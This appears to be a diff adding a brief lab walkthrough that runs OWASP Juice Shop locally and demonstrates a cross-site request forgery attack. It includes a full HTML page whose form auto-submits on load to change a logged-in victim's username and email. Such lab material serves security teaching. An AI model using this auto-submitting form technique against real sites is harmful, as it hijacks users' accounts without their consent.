@@ -1,0 +1,17 @@
+docker run -d -p 3000:3000 bkimminich/juice-shop
+Open http://localhost:3000 → login with your account
+Press F12 → Network tab → navigate to profile update feature → identify the HTTP request
+Create a file named csrf.html with this content:
+
+html<html>
+<head><title>CSRF Attack Demo</title></head>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:3000/rest/user/profile" method="POST">
+    <input type="hidden" name="username" value="student">
+    <input type="hidden" name="email" value="attacker@example.com">
+  </form>
+</body>
+</html>
+
+Make sure victim is logged in to Juice Shop → open csrf.html in the same browser
+Form auto-submits → check if profile info changed to verify attack success
